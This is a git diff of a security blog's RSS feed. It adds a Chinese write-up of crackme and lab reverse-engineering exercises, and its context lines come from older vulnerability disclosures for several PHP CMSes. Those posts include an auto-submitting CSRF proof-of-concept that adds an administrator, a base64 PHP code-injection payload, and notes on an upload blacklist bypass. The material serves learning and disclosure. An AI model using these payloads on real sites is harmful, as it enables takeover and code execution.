@@ -1,11 +1,158 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Larryxi&#39;s blog - Articles</title>
-    <description>Larryxi&#39;s blog,learn security everyday.
+    <title>Larryxi's blog - Articles</title>
+    <description>Larryxi's blog,learn security everyday.
 </description>
     <link>
     https://larryxi.github.io</link>
+    
+      
+      <item>
+        <title>Binexp 逆向分析初体验</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
+
+&lt;p&gt;怎么着都得去学习接触二进制，才能算是踏入安全的领域，所以就跟着&lt;a href=&quot;http://security.cs.rpi.edu/courses/binexp-spring2015/&quot;&gt;Modern Binary Exploitation&lt;/a&gt;加强一下学习，主要还是以探究做练习为主，争取不拖团队后腿。（本次练习的题目是课程前四周涉及的内容）&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-crackme&quot;&gt;0x01 Crackme&lt;/h1&gt;
+
+&lt;p&gt;在crackme0x00a中直接加载进入IDA，主要逻辑为输入密码并判断正误，牛刀小试。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在crackme0x00b中，程序和0x00a类似，不过是使用_wcscmp来比较字符串，但在scanf中也有%ls修饰输入为宽字节，在Linux-x86下为utf-32编码，直接跟进看是哪些字符就好：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不仔细的话就会先入为主被IDA的注释给坑了，也可以在hex-view查看相关数据：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;crackme0x01则是比较输入的数字，同样easy：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Crackme0x02进行了一下加法和乘法的运算：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Crackme0x04也是先输入一段字符串，然后调用check函数，check检测字符串的长度是否为15就ok了：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Crackme0x03的前半段逻辑一样，进行加法和乘法的运算后，调用test(int(s),338724)函数，很明显输入相等即可成功：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不过这里将输出“加密”了一下，跟进shift函数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以将字符统一前移3位即可显形。&lt;/p&gt;
+
+&lt;p&gt;Crackeme0x05中输入字符串后调用check函数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Check函数检测输入的各个字符上的数字之和是否为16，再决定调用parell函数与否，在parell函数中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;将输入的数字和1按位相与，数值不是奇数即可pass：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Crackme0x06和逻辑和0x05类似，都有check和parell函数，并且传入了程序启动时的envp参数，并在parell函数中增加了dummy函数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;只有dummy函数返回真值，并且输入的数字各个位数和为16且不是奇数才算成功。在dummy函数中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在函数调用伊始，栈中布局为EBP,RETURN ADDRESS, int(s),envp，所以说ebp+arg_4即ebp+0Ch指向的就是envp。那么函数的逻辑就显而易见了，循环环境变量数组，如果有”LOL”开头的环境变量就返回1，否则返回0。&lt;/p&gt;
+
+&lt;p&gt;我们允许程序前添加对应的环境变量，再按0x05的套路来就crack了：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Crackme0x07的逻辑和0x06类似，不过要求各个位数和为24，而且传入的参数变为arg_8，应该和linux下程序的启动有关，可见&lt;a href=&quot;http://www.jianshu.com/p/eb39eac9d82e&quot;&gt;这里&lt;/a&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其他的按部就班就好：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Crackme0x08和0x07一样：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Crackme0x09和0x08一样，就不赘述了。&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-lab&quot;&gt;0x02 Lab&lt;/h1&gt;
+
+&lt;p&gt;Lab1程序开始初始化var_1，然后就是常规的让我们输入密码判断正确性：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;之后的流程如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;loc_804853E和loc_8048539处的代码可以理解为一直循环到输入字符串的末尾，然后每个字符都进入loc_80484FF的比较逻辑，如果每个字符都满足&lt;code&gt;s[var_1] == var_1 ^ storedpass[var_1]&lt;/code&gt;，那就是妥妥的成功了。所以就有：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lab2的验证流程和Lab1类似，也是将存储好的字符串进行一定的变换，再和我们输入的密码比较是否相符：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从汇编代码来看其中可能是进行了一个除法的操作，在计算出MagicNumber后可以得到关键的比较逻辑&lt;code&gt;if(i+1)^storedpass[i] == s[i])&lt;/code&gt;，对应还原即可：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lab3的主要逻辑是需要我们输入长度大于5的用户名，然后逆向出相应的序列号才算成功，汇编上的表现就是将内部生成的序列号和我们输入的进行对比：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中dword_804A034处保存的是我们输入的序列号：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;dword_804A038处保存的是内部算法生成的序列号：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;遇到的第一个坑就是这里不知道dword_804A038的初始值，在经历了patch程序去除ptrace的反调试又载入gdb没有相应的符号表和IDA远程调试无法attach程序后，最终还是知道了.bss段的存在，dword_804A038在程序中是全局变量的存在，所以其初始值为0：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;那么一切都很完美了，按照代码的逻辑即可计算出相应的序列码，可是’larry’对应的468总是不对，而偶然尝试的’00000’对应的序列码0又是成立的，很是奇怪：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;隐约感觉到问题还是可能出在&lt;code&gt; ([dword_804A038] + name[i]) ^ name[(i-1)%strlen(name)]&lt;/code&gt;这一句代码中，于是在参考&lt;a href=&quot;http://blog.csdn.net/wjcsharp/article/details/11075993&quot;&gt;这里&lt;/a&gt;后，修改了sp的值，再F5看汇编的伪代码，结果和我分析的逻辑是一样的，还是很困惑：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最后还是觉得应该从汇编的角度去看，觉得问题可能会存在于汇编的div中，探索一番发现汇编的取余数和C语言及Python的取模还是有区别的。实验一番发现，在Python里-1%5的结果为4，在C语言里-1%5的结果为-1，而从汇编的角度来看第一次异或的值就应该是&lt;code&gt;name[0xffffffff]%strlen(name)]&lt;/code&gt;，所以’larry’对应的序列号就是297，实验如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170725/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x03-&quot;&gt;0x03 总结&lt;/h1&gt;
+
+&lt;p&gt;逆向分析C语言相关的题目时，多看看《C++反汇编与逆向分析技术揭秘》这本书也是挺好的，接触得多了也就能肉眼翻译出汇编代码对应的高级语言代码，多看多验证自己的想法总是有益的，对于汇编指令的理解和gdb动态调试方面还需要加强，IDA用得熟练也是必须要做到的。&lt;/p&gt;
+
+</description>
+        
+        <pubDate>Tue, 25 Jul 2017 00:00:00 +0800</pubDate>
+        <link>
+        https://larryxi.github.io/binexp-reverse-exercise.html</link>
+        <guid isPermaLink="true">https://larryxi.github.io/binexp-reverse-exercise.html</guid>
+      </item>
+      
     
       
       <item>
@@ -32,7 +179,7 @@
 
 &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170420/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;具体在file方法中，首先获取上传文件的后缀，进行黑名单&lt;code&gt;array(&#39;php&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;vbs&#39;,&#39;bat&#39;,&#39;asa&#39;)&lt;/code&gt;的检测，这里很明显的黑名单不完全，配合一些服务器的解析漏洞是可以直接拿shell的，也就不细说了。然后80行对文件进行记录后就进行上传的操作。&lt;/p&gt;
+&lt;p&gt;具体在file方法中，首先获取上传文件的后缀，进行黑名单&lt;code&gt;array('php','asp','aspx','vbs','bat','asa')&lt;/code&gt;的检测，这里很明显的黑名单不完全，配合一些服务器的解析漏洞是可以直接拿shell的，也就不细说了。然后80行对文件进行记录后就进行上传的操作。&lt;/p&gt;
 
 &lt;p&gt;跟进record方法，如下：&lt;/p&gt;
 
@@ -48,18 +195,20 @@
 
 &lt;p&gt;简单写个本地post file的html，如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://demo.xercms.com/index.php?m=member&amp;amp;a=upfiles&amp;amp;id=1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;multipart/form-data&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;file&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;larry&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;form action=&amp;quot;http://demo.xercms.com/index.php?m=member&amp;amp;a=upfiles&amp;amp;id=1&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
+    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;larry&amp;quot; /&amp;gt;
+    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot; /&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;然后burp抓包修改文件名即可进行注入，demo演示如下：&lt;/p&gt;
 
@@ -83,7 +232,7 @@
 
 </description>
         
-        <pubDate>Thu, 20 Apr 2017 00:00:00 -0400</pubDate>
+        <pubDate>Thu, 20 Apr 2017 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/xercms-vuls.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/xercms-vuls.html</guid>
@@ -151,7 +300,7 @@
 
 </description>
         
-        <pubDate>Sat, 15 Apr 2017 00:00:00 -0400</pubDate>
+        <pubDate>Sat, 15 Apr 2017 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/damicms-logic-vuls.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/damicms-logic-vuls.html</guid>
@@ -241,7 +390,7 @@
 
 </description>
         
-        <pubDate>Fri, 07 Apr 2017 00:00:00 -0400</pubDate>
+        <pubDate>Fri, 07 Apr 2017 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/catfish-cms-vuls.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/catfish-cms-vuls.html</guid>
@@ -280,27 +429,29 @@
 
 &lt;p&gt;下面简单给个PoC代码&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://localhost/dayucms/dayucms.php?file=admin&amp;amp;action=add&amp;amp;roleid=1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;do_submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;newadmin[roleid]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;newadmin[username]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;larry&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;newadmin[password]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;larry&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;newadmin[category][]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;newadmin[allowmultilogin]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;newadmin[disabled]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+    &amp;lt;form action=&amp;quot;http://localhost/dayucms/dayucms.php?file=admin&amp;amp;action=add&amp;amp;roleid=1&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;do_submit&amp;quot; value=&amp;quot;1&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;newadmin[roleid]&amp;quot; value=&amp;quot;1&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;newadmin[username]&amp;quot; value=&amp;quot;larry&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;newadmin[password]&amp;quot; value=&amp;quot;larry&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;newadmin[category][]&amp;quot; value=&amp;quot;0&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;newadmin[allowmultilogin]&amp;quot; value=&amp;quot;1&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;newadmin[disabled]&amp;quot; value=&amp;quot;0&amp;quot;&amp;gt;
+    &amp;lt;/form&amp;gt;
 
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
+        document.forms[0].submit();
+    &amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;最后使用虚拟机搭建PoC来验证CSRF，结果可成功添加管理员：&lt;/p&gt;
 
@@ -324,7 +475,7 @@
 
 &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170301/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;在后台导入规则处传入&lt;code&gt;larry-&#39;larry&#39;;phpinfo()的base64&lt;/code&gt;编码&lt;code&gt;bGFycnk=-J2xhcnJ5JztwaHBpbmZvKCk=&lt;/code&gt;后（’-‘分割），即可执行php代码：&lt;/p&gt;
+&lt;p&gt;在后台导入规则处传入&lt;code&gt;larry-'larry';phpinfo()的base64&lt;/code&gt;编码&lt;code&gt;bGFycnk=-J2xhcnJ5JztwaHBpbmZvKCk=&lt;/code&gt;后（’-‘分割），即可执行php代码：&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20170301/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -336,27 +487,29 @@
 
 &lt;p&gt;PoC代码如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://192.168.1.103/dayucms/dayucms.php?mod=gather&amp;amp;file=gather&amp;amp;action=import&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
